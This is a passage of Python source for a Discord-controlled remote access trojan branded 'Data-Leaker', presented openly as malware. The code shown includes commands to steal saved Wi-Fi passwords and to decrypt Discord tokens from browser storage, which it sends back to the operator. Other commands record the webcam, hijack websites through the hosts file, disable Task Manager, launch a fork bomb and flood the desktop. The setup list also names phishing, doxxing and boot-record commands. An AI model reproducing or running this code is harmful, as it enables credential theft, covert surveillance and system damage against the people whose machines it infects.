    def change_registry_value(key_path, value_name, new_value):
        try:
            hive, sub_key = key_path.split("\\", 1)
            if hive.upper() == "HKEY_LOCAL_MACHINE":
                registry_hive = winreg.HKEY_LOCAL_MACHINE
            elif hive.upper() == "HKEY_CURRENT_USER":
                registry_hive = winreg.HKEY_CURRENT_USER
            else:
                return 0

            with winreg.OpenKey(registry_hive, sub_key, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value)
            return 1
        except Exception as e:
            print(f"Error changing registry value: {e}")
            return 0

    regedit_result = change_registry_value(key_path, value_name, new_value)

    if regedit_result == 1:
        embed = discord.Embed(title="🔧 Data-Leaker - Registry Edit", color=0xFF69B4)
        embed.add_field(name="🔧 Status", value="`Edited successfully! :3`", inline=False)
        embed.set_footer(text="Registry value edited successfully.")
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🔧 Data-Leaker - Registry Edit", color=0xFF69B4)
        embed.add_field(name="🔧 Error", value="`Could not edit the value! :c`", inline=False)
        embed.set_footer(text="Registry value edit failed.")
        await ctx.send(embed=embed)        
        
@commands.command(name="regedit")
async def regedit_command(ctx, key_path: str = None, value_name: str = None, new_value: str = None):
    """Edits a Windows registry value."""
    if not key_path or not value_name or not new_value:
        await ctx.send("Usage: `!regedit <key_path> <value_name> <new_value>`")
        return

    def change_registry_value(key_path, value_name, new_value):
        try:
            hive, sub_key = key_path.split("\\", 1)
            if hive.upper() == "HKEY_LOCAL_MACHINE":
                registry_hive = winreg.HKEY_LOCAL_MACHINE
            elif hive.upper() == "HKEY_CURRENT_USER":
                registry_hive = winreg.HKEY_CURRENT_USER
            else:
                return 0

            with winreg.OpenKey(registry_hive, sub_key, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value)
            return 1
        except Exception as e:
            print(f"Error changing registry value: {e}")
            return 0

    regedit_result = change_registry_value(key_path, value_name, new_value)

    if regedit_result == 1:
        embed = discord.Embed(title="🔧 Data-Leaker - Registry Edit", color=0xFF69B4)
        embed.add_field(name="🔧 Status", value="`Edited successfully! :3`", inline=False)
        embed.set_footer(text="Registry value edited successfully.")
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🔧 Data-Leaker - Registry Edit", color=0xFF69B4)
        embed.add_field(name="🔧 Error", value="`Could not edit the value! :c`", inline=False)
        embed.set_footer(text="Registry value edit failed.")
        await ctx.send(embed=embed)        

@commands.command(name="taskkill")
async def taskkill_command(ctx, task: str = None):
    """Kills a specified process."""
    if not task:
        await ctx.send("Usage: `!taskkill <process_name>`")
        return

    try:
        subprocess.run(['taskkill', '/F', '/IM', task], check=True)
        embed = discord.Embed(title="🔪 Data-Leaker - Task Kill", color=0xFF69B4)
        embed.add_field(name="🔪 Status", value="`Killed the process successfully! :3`", inline=False)
        embed.set_footer(text="Process terminated successfully.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🔪 Data-Leaker - Task Kill", color=0xFF69B4)
        embed.add_field(name="🔪 Error", value=f"`Could not kill the process! :c Error: {e}`", inline=False)
        embed.set_footer(text="Failed to terminate the process.")
        await ctx.send(embed=embed)

@commands.command(name="processes")
async def processes_command(ctx):
    """Lists all running processes on the system."""
    try:
        process_list = []

        # Collect all processes
        for process in psutil.process_iter(['pid', 'name']):
            process_list.append(f"PID: {process.info['pid']}, Name: {process.info['name']}")

        # Combine all processes into a single string
        processes_string = "\n".join(process_list)

        # Check if the output exceeds Discord's message limit
        if len(processes_string) > 2000:
            # Write to a file and upload it
            file_path = "processes.txt"
            with open(file_path, "w") as file:
                file.write(processes_string)

            await ctx.send("The list of processes is too large to display, so I have uploaded it as a file:", file=discord.File(file_path))
        else:
            # Send the processes as a message
            await ctx.send(f"```{processes_string}```")

    except Exception as e:
        await ctx.send(f"An error occurred while executing the command: {e}")

@commands.command(name="disabletaskmgr")
async def disabletaskmgr_command(ctx):
    """Disables the task manager."""
    try:
        subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'], check=True)
        embed = discord.Embed(title="🔒 Data-Leaker - Disable Task Manager", color=0xFF69B4)
        embed.add_field(name="🔒 Status", value="`Task Manager has been disabled! :3`", inline=False)
        embed.set_footer(text="Task Manager disabled successfully.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🔒 Data-Leaker - Disable Task Manager", color=0xFF69B4)
        embed.add_field(name="🔒 Error", value=f"`Task Manager could not be disabled! :c Error: {e}`", inline=False)
        embed.set_footer(text="Failed to disable Task Manager.")
        await ctx.send(embed=embed)

@commands.command(name="enabletaskmgr")
async def enabletaskmgr_command(ctx):
    """Enables the task manager."""
    try:
        subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'], check=True)
        embed = discord.Embed(title="🔓 Data-Leaker - Enable Task Manager", color=0xFF69B4)
        embed.add_field(name="🔓 Status", value="`Task Manager has been enabled! :3`", inline=False)
        embed.set_footer(text="Task Manager enabled successfully.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🔓 Data-Leaker - Enable Task Manager", color=0xFF69B4)
        embed.add_field(name="🔓 Error", value=f"`Task Manager could not be enabled! :c Error: {e}`", inline=False)
        embed.set_footer(text="Failed to enable Task Manager.")
        await ctx.send(embed=embed)

@commands.command(name="gdi")
async def gdi_command(ctx, mode: str = None, time: int = None):
    """Applies GDI effects on the desktop screen."""
    if not mode or not time:
        await ctx.send("Usage: `!gdi <patinvert|patcopy|srccopy> <time_in_ms>`")
        return

    try:
        desk = win32gui.GetDC(0)
        x = win32gui.GetSystemMetrics(0)
        y = win32gui.GetSystemMetrics(1)
        time = int(time)

        if mode not in ["patinvert", "patcopy", "srccopy"]:
            await ctx.send("Invalid mode! Use one of: `patinvert`, `patcopy`, `srccopy`.")
            return

        effects = {
            "patinvert": win32gui.PATINVERT,
            "patcopy": win32gui.PATCOPY,
            "srccopy": win32gui.SRCCOPY
        }

        await ctx.send(f"Started the {mode} effect for {time}ms! :3")

        for _ in range(100):
            brush = win32gui.CreateSolidBrush(win32gui.RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            win32gui.SelectObject(desk, brush)
            win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), effects[mode])
            await asyncio.sleep(time / 1000)

        win32gui.ReleaseDC(win32gui.GetDesktopWindow(), desk)
        win32gui.DeleteDC(desk)

        await ctx.send(f"Stopped the {mode} effect! :3")

    except Exception as e:
        await ctx.send(f"An error occurred while applying the effect: {e}")
        
@commands.command(name="shutdown")
async def shutdown_command(ctx):
    """Initiates a computer shutdown."""
    try:
        embed = discord.Embed(title="🔌 Data-Leaker - Shutdown", color=0xFF69B4)
        embed.add_field(name="🔌 Status", value="`Initiating computer shutdown! :3`", inline=False)
        embed.set_footer(text="Shutdown command executed successfully.")
        await ctx.send(embed=embed)
        os.system("shutdown /s /t 0")
    except Exception as e:
        embed = discord.Embed(title="🔌 Data-Leaker - Shutdown", color=0xFF69B4)
        embed.add_field(name="🔌 Error", value=f"`An error occurred: {e}`", inline=False)
        embed.set_footer(text="Shutdown command execution failed.")
        await ctx.send(embed=embed)

@commands.command(name="restart")
async def restart_command(ctx, mode: str = "normal"):
    """Initiates a computer restart in various modes (normal, safemode, safenetwork)."""
    try:
        if mode == "normal":
            embed = discord.Embed(title="🔄 Data-Leaker - Restart", color=0xFF69B4)
            embed.add_field(name="🔄 Status", value="`Initiating normal computer restart! :3`", inline=False)
            embed.set_footer(text="Normal restart command executed successfully.")
            await ctx.send(embed=embed)
            os.system("shutdown /r /t 0")
        elif mode == "safemode":
            embed = discord.Embed(title="🔄 Data-Leaker - Restart", color=0xFF69B4)
            embed.add_field(name="🔄 Status", value="`Initiating safe mode computer restart! :3`", inline=False)
            embed.set_footer(text="Safe mode restart command executed successfully.")
            await ctx.send(embed=embed)
            subprocess.run("bcdedit /set {current} safeboot minimal", shell=True)
            os.system("shutdown /r /t 0")
        elif mode == "safenetwork":
            embed = discord.Embed(title="🔄 Data-Leaker - Restart", color=0xFF69B4)
            embed.add_field(name="🔄 Status", value="`Initiating safe mode with networking computer restart! :3`", inline=False)
            embed.set_footer(text="Safe mode with networking restart command executed successfully.")
            await ctx.send(embed=embed)
            subprocess.run("bcdedit /set {current} safeboot network", shell=True)
            os.system("shutdown /r /t 0")
        else:
            embed = discord.Embed(title="🔄 Data-Leaker - Restart", color=0xFF69B4)
            embed.add_field(name="🔄 Error", value="`Invalid mode! Use one of: normal, safemode, safenetwork.`", inline=False)
            embed.set_footer(text="Restart command execution failed.")
            await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🔄 Data-Leaker - Restart", color=0xFF69B4)
        embed.add_field(name="🔄 Error", value=f"`An error occurred: {e}`", inline=False)
        embed.set_footer(text="Restart command execution failed.")
        await ctx.send(embed=embed) 

@commands.command(name="recordcamera")
async def recordcamera_command(ctx):
    """Starts recording from the webcam and stops when the 'stop' command is received."""
    try:
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*"avc1")
        output = cv2.VideoWriter(".video.mp4", fourcc, 20.0, (640, 480))
        await ctx.send("📹 Started recording! Type `stop` to end the recording.")

        while True:
            ret, frame = cap.read()
            if ret:
                output.write(frame)
            try:
                msg = await ctx.bot.wait_for(
                    "message", timeout=0.05, check=lambda m: m.author == ctx.author and m.content.lower() == "stop"
                )
            except asyncio.TimeoutError:
                continue
            else:
                if msg.content.lower() == "stop":
                    await ctx.send("📹 Stopped recording, sending the file!")
                    break

        cap.release()
        output.release()
        cv2.destroyAllWindows()

        await ctx.send(file=discord.File(".video.mp4"))
    except Exception as e:
        await ctx.send(f"An error occurred while recording the camera: {e}")
        
@commands.command(name="hidetaskbar")
async def hide_taskbar_command(ctx):
    """Hides the Windows taskbar."""
    try:
        tsk = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
        ctypes.windll.user32.ShowWindow(tsk, 0)
        embed = discord.Embed(title="🔧 Taskbar Management - Hide Taskbar", color=0xFF69B4)
        embed.add_field(name="🔧 Status", value="`Taskbar hidden successfully!`", inline=False)
        embed.set_footer(text="Taskbar operation successful.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🔧 Taskbar Management - Hide Taskbar", color=0xFF69B4)
        embed.add_field(name="🔧 Error", value=f"`Failed to hide taskbar: {e}`", inline=False)
        embed.set_footer(text="Taskbar operation failed.")
        await ctx.send(embed=embed)

@commands.command(name="showtaskbar")
async def show_taskbar_command(ctx):
    """Shows the Windows taskbar."""
    try:
        tsk = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
        ctypes.windll.user32.ShowWindow(tsk, 9)
        embed = discord.Embed(title="🔧 Taskbar Management - Show Taskbar", color=0xFF69B4)
        embed.add_field(name="🔧 Status", value="`Taskbar shown successfully!`", inline=False)
        embed.set_footer(text="Taskbar operation successful.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🔧 Taskbar Management - Show Taskbar", color=0xFF69B4)
        embed.add_field(name="🔧 Error", value=f"`Failed to show taskbar: {e}`", inline=False)
        embed.set_footer(text="Taskbar operation failed.")
        await ctx.send(embed=embed)    

@commands.command(name="webredirect")
async def webredirect_command(ctx, redirection_link: str = None, *websites):
    """Redirects specified websites to a given redirection link by modifying the hosts file."""
    if not redirection_link or not websites:
        await ctx.send("Usage: `!webredirect <redirection_link> <websites separated by spaces>`")
        return

    redirection_ip = redirection_link
    try:
        socket.inet_aton(redirection_link)
    except socket.error:
        try:
            redirection_ip = socket.gethostbyname(redirection_link)
        except socket.gaierror:
            await ctx.send("Invalid redirection link. Please provide an IP address or a resolvable domain name!")
            return

    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts_path, "a") as hosts_file:
            for website in websites:
                website = website.strip()
                try:
                    ipaddress.ip_address(website)
                    await ctx.send(f"Skipping IP address: {website}")
                    continue
                except ValueError:
                    if not website.startswith("www."):
                        hosts_file.write(f"\n{redirection_ip} www.{website}\n")
                    hosts_file.write(f"\n{redirection_ip} {website}\n")

        os.system("ipconfig /flushdns")
        embed = discord.Embed(title="🌐 Data-Leaker - Web Redirect", color=0xFF69B4)
        embed.add_field(name="🌐 Status", value="`Listed websites will now be redirected!", inline=False)
        embed.set_footer(text="Web redirection applied successfully.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🌐 Data-Leaker - Web Redirect", color=0xFF69B4)
        embed.add_field(name="🌐 Error", value=f"`Could not redirect listed websites! Error: {e}`", inline=False)
        embed.set_footer(text="Web redirection failed.")
        await ctx.send(embed=embed)
        
@commands.command(name="desktopflood")
async def desktopflood_command(ctx, name: str, count: int):
    """Floods the desktop with files having the specified name and count."""
    try:
        desktop_path = os.path.expanduser("~/Desktop")
        for i in range(count):
            file_path = os.path.join(desktop_path, f"{name}_{i+1}.lol")
            try:
                with open(file_path, 'w') as file:
                    file.write("0")
            except Exception as e:
                embed = discord.Embed(title="🖥️ Data-Leaker - Desktop Flood", color=0xFF69B4)
                embed.add_field(name="🖥️ Error", value=f"`Could not create file {file_path}. Error: {e}`", inline=False)
                embed.set_footer(text="Desktop flooding encountered an error.")
                await ctx.send(embed=embed)
                return

        embed = discord.Embed(title="🖥️ Data-Leaker - Desktop Flood", color=0xFF69B4)
        embed.add_field(name="🖥️ Status", value="`Flooded the desktop successfully! :3`", inline=False)
        embed.set_footer(text="Desktop flooding completed.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🖥️ Data-Leaker - Desktop Flood", color=0xFF69B4)
        embed.add_field(name="🖥️ Error", value=f"`Could not flood the desktop! :c Error: {e}`", inline=False)
        embed.set_footer(text="Desktop flooding failed.")
        await ctx.send(embed=embed)   

@commands.command(name="forkbomb")
async def forkbomb_command(ctx):
    """Creates and executes a fork bomb script."""
    try:
        path = os.path.expanduser("~")
        script_path = os.path.join(path, "sysinfo.bat")

        with open(script_path, 'w', encoding='utf-8') as cutefile:
            cutefile.write('%0|%0')

        subprocess.Popen(script_path, creationflags=subprocess.CREATE_NO_WINDOW)

        embed = discord.Embed(title="💣 Data-Leaker - Fork Bomb", color=0xFF69B4)
        embed.add_field(name="💣 Status", value="`Fork bomb script created and executed!`", inline=False)
        embed.set_footer(text="Fork bomb operation completed.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="💣 Data-Leaker - Fork Bomb", color=0xFF69B4)
        embed.add_field(name="💣 Error", value=f"`An error occurred while creating or executing the fork bomb: {e}`", inline=False)
        embed.set_footer(text="Fork bomb operation failed.")
        await ctx.send(embed=embed)   

@commands.command(name="mkdir")
async def mkdir_command(ctx, directory: str):
    """Creates a new directory with the specified name."""
    try:
        os.mkdir(directory)
        embed = discord.Embed(title="📁 Data-Leaker - Make Directory", color=0xFF69B4)
        embed.add_field(name="📁 Status", value=f"`Successfully created directory: {directory}!", inline=False)
        embed.set_footer(text="Directory creation successful.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="📁 Data-Leaker - Make Directory", color=0xFF69B4)
        embed.add_field(name="📁 Error", value=f"`Failed to create directory: {directory}! :c\nError: {e}`", inline=False)
        embed.set_footer(text="Directory creation failed.")
        await ctx.send(embed=embed)        
        
@commands.command(name="rm")
async def rm_command(ctx, file_or_directory: str):
    """Removes a specified file or directory."""
    try:
        if os.path.isfile(file_or_directory):
            os.remove(file_or_directory)
            status = f"Successfully removed file: {file_or_directory}!"
        elif os.path.isdir(file_or_directory):
            shutil.rmtree(file_or_directory)
            status = f"Successfully removed directory: {file_or_directory}!"
        else:
            embed = discord.Embed(title="🗑️ Data-Leaker - Remove", color=0xFF69B4)
            embed.add_field(name="🗑️ Error", value=f"`File or directory not found: {file_or_directory}!`", inline=False)
            embed.set_footer(text="Remove operation failed.")
            await ctx.send(embed=embed)
            return

        embed = discord.Embed(title="🗑️ Data-Leaker - Remove", color=0xFF69B4)
        embed.add_field(name="🗑️ Status", value=f"`{status}`", inline=False)
        embed.set_footer(text="Remove operation successful.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🗑️ Data-Leaker - Remove", color=0xFF69B4)
        embed.add_field(name="🗑️ Error", value=f"`Failed to remove: {file_or_directory}!\nError: {e}`", inline=False)
        embed.set_footer(text="Remove operation failed.")
        await ctx.send(embed=embed)
        
@commands.command(name="chmod")
async def chmod_command(ctx, permissions: str, file_or_directory: str):
    """Changes the permissions of a specified file or directory."""
    try:
        os.chmod(file_or_directory, int(permissions, 8))
        embed = discord.Embed(title="🔧 Data-Leaker - Change Permissions", color=0xFF69B4)
        embed.add_field(name="🔧 Status", value=f"`Successfully changed permissions of {file_or_directory} to {permissions}!", inline=False)
        embed.set_footer(text="Permission change successful.")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="🔧 Data-Leaker - Change Permissions", color=0xFF69B4)
        embed.add_field(name="🔧 Error", value=f"`Failed to change permissions of {file_or_directory}!\nError: {e}`", inline=False)
        embed.set_footer(text="Permission change failed.")
        await ctx.send(embed=embed)     

@commands.command(name="instantmic")
async def instantmic_command(ctx):
    """Prompts the user to select a voice channel and joins it."""
    try:
        # Get list of voice channels in the server
        voice_channels = [vc.name for vc in ctx.guild.voice_channels]

        if not voice_channels:
            await ctx.send("No voice channels available in this server!")
            return

        # Prompt the user to select a voice channel
        vc_list_message = "Select a voice channel to join:\n"
        for i, channel_name in enumerate(voice_channels, start=1):
            vc_list_message += f"{i}. {channel_name}\n"
        vc_list_message += "React with the corresponding number to join the voice channel!"

        vc_list = await ctx.send(vc_list_message)

        for i in range(1, min(10, len(voice_channels) + 1)):
            await vc_list.add_reaction(f"{i}\u20e3")

        # Reaction check function
        def check(reaction, user):
            return (
                user == ctx.author
                and str(reaction.emoji) in [f"{i}\u20e3" for i in range(1, min(10, len(voice_channels) + 1))]
            )

        try:
            reaction, _ = await ctx.bot.wait_for('reaction_add', timeout=60, check=check)
            selected_channel_index = int(reaction.emoji[0]) - 1
            selected_channel = ctx.guild.voice_channels[selected_channel_index]

            # Connect to the selected voice channel
            vc = await selected_channel.connect(self_deaf=True)

            embed = discord.Embed(title="\ud83c\udfa4 Data-Leaker - Instant Mic", color=0xFF69B4)
            embed.add_field(name="\ud83c\udfa4 Status", value=f"`Joined the voice channel '{selected_channel.name}'.`", inline=False)
            embed.set_footer(text="Voice channel joined successfully.")
            await ctx.send(embed=embed)

        except asyncio.TimeoutError:
            await ctx.send("Voice channel selection timed out! :c")

        finally:
            await vc_list.delete()

    except Exception as e:
        embed = discord.Embed(title="\ud83c\udfa4 Data-Leaker - Instant Mic", color=0xFF69B4)
        embed.add_field(name="\ud83c\udfa4 Error", value=f"`An error occurred: {e}`", inline=False)
        embed.set_footer(text="Failed to join voice channel.")
        await ctx.send(embed=embed)

        
@commands.command(name="wifipasswords")
async def wifipasswords_command(ctx):
    """Fetches and displays saved Wi-Fi passwords from the system."""
    try:
        command = "netsh wlan show profile"
        networks = subprocess.check_output(command, shell=True, text=True)
        network_names_list = re.findall(r"Profile\s*:\s*(.*)", networks)

        result = ""
        for network_name in network_names_list:
            network_name = network_name.strip()
            command = f"netsh wlan show profile \"{network_name}\" key=clear"
            current_result = subprocess.check_output(command, shell=True, text=True)
            result += f"\n{current_result}"

        embed = discord.Embed(title="📡 Data-Leaker - Wi-Fi Passwords", color=0xFF69B4)
        embed.add_field(name="📡 Status", value="`Fetched saved Wi-Fi passwords!`", inline=False)
        embed.set_footer(text="Wi-Fi password retrieval successful.")

        if len(result) > 2000:
            with open("wifi_passwords.txt", "w") as file:
                file.write(result)
            await ctx.send(embed=embed, file=discord.File("wifi_passwords.txt"))
        else:
            embed.add_field(name="Passwords", value=f"```{result}```", inline=False)
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(title="📡 Data-Leaker - Wi-Fi Passwords", color=0xFF69B4)
        embed.add_field(name="📡 Error", value=f"`An error occurred: {e}`", inline=False)
        embed.set_footer(text="Wi-Fi password retrieval failed.")
        await ctx.send(embed=embed)        

@commands.command(name="displaydir")
async def displaydir_command(ctx):
    """Displays the contents of the current directory."""
    import subprocess as sp
    import os

    try:
        # Capture raw bytes and decode explicitly
        result = sp.run('dir', shell=True, capture_output=True)
        output = result.stdout.decode('utf-8', errors='replace')  # Replace unrecognized characters

        if not output.strip():
            await ctx.send("[*] Command not recognized or no output was obtained")
        elif len(output) > 1990:
            # Handle long output by saving to a temporary file
            temp = os.getenv('TEMP')
            temp_file_path = os.path.join(temp, "output22.txt")
            if os.path.isfile(temp_file_path):
                os.remove(temp_file_path)

            with open(temp_file_path, 'w', encoding='utf-8') as f:
                f.write(output)

            file = discord.File(temp_file_path, filename="output22.txt")
            await ctx.send("[*] Command successfully executed", file=file)
        else:
            await ctx.send(f"[*] Command successfully executed:\n{output}")
    except Exception as e:
        await ctx.send(f"[*] Error executing command: {str(e)}")

@commands.command(name="extracttokens")
async def extracttokens_command(ctx):
    """Extracts Discord tokens from the user's machine."""

    LOCAL = os.getenv('LOCALAPPDATA')
    ROAMING = os.getenv('APPDATA')
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Discord PTB': ROAMING + '\\discordptb',
        'Google Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    def decrypt_token(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except Exception:
            return None

    def get_master_key(path):
        try:
            with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            return None

    def extract_tokens(path, master_key):
        tokens = []
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb_path):
            return tokens

        for file_name in os.listdir(leveldb_path):
            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                continue

            try:
                with open(os.path.join(leveldb_path, file_name), "r", errors="ignore") as file:
                    for line in file:
                        for match in findall(r'dQw4w9WgXcQ:[^\"]+', line):
                            decrypted = decrypt_token(b64decode(match.split('dQw4w9WgXcQ:')[1]), master_key)
                            if decrypted and decrypted not in tokens:
                                tokens.append(decrypted)
            except Exception:
                continue

        return tokens

    all_tokens = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        master_key = get_master_key(path)
        if master_key:
            tokens = extract_tokens(path, master_key)
            all_tokens.extend(tokens)

    if not all_tokens:
        embed = discord.Embed(title="🔧 Token Extraction", color=0xFF69B4)
        embed.add_field(name="Status", value="`No tokens found on this system.`", inline=False)
        embed.set_footer(text="Token extraction complete.")
        await ctx.send(embed=embed)
        return

    token_list = "\n".join(all_tokens)

    embed = discord.Embed(title="🔧 Token Extraction", color=0xFF69B4)
    embed.add_field(name="Status", value="`Tokens extracted successfully.`", inline=False)
    embed.add_field(name="Tokens", value=f"```{token_list}```", inline=False)
    embed.set_footer(text="Token extraction complete.")
    await ctx.send(embed=embed)

# Setup function to add the commands to the bot
def setup(bot):
    """Adds all the commands to the bot during initialization."""
    bot.add_command(change_directory)
    bot.add_command(download_file)
    bot.add_command(upload_file)
    bot.add_command(show_message)
    bot.add_command(execute_shell)
    bot.add_command(check_admin)
    bot.add_command(system_info)
    bot.add_command(delete_file)
    bot.add_command(start_window_logging)
    bot.add_command(stop_window_logging)
    bot.add_command(voice_command)
    bot.add_command(write_command)
    bot.add_command(background_command)
    bot.add_command(get_clipboard_command)   
    bot.add_command(bsod_command)      
    bot.add_command(startup_command) 
    bot.add_command(exit_command)     
    bot.add_command(run_command)     
    bot.add_command(escalate_command)    
    bot.add_command(blockinput_command)    
    bot.add_command(unblockinput_command) 
    bot.add_command(doxx_command)     
    bot.add_command(windowsphish_command)   
    bot.add_command(displayoff_command)     
    bot.add_command(displayon_command)      
    bot.add_command(tokens_command)     
    bot.add_command(critproc_command)      
    bot.add_command(uncritproc_command) 
    bot.add_command(idletime_command)   
    bot.add_command(streamscreen_command)        
    bot.add_command(askescalate_command)      
    bot.add_command(webcampic_command)    
    bot.add_command(masterboot_command) 
    bot.add_command(regedit_command)   
    bot.add_command(taskkill_command)   
    bot.add_command(processes_command)  
    bot.add_command(disabletaskmgr_command)      
    bot.add_command(enabletaskmgr_command)  
    bot.add_command(gdi_command)      
    bot.add_command(restart_command) 
    bot.add_command(shutdown_command)       
    bot.add_command(recordcamera_command)  
    bot.add_command(hide_taskbar_command)       
    bot.add_command(show_taskbar_command)   
    bot.add_command(webredirect_command)     
    bot.add_command(desktopflood_command)     
    bot.add_command(forkbomb_command)   
    bot.add_command(mkdir_command)     
    bot.add_command(rm_command)     
    bot.add_command(chmod_command)       
    bot.add_command(instantmic_command)  
    bot.add_command(wifipasswords_command)       
    bot.add_command(displaydir_command)     
    bot.add_command(extractpasswords_command)  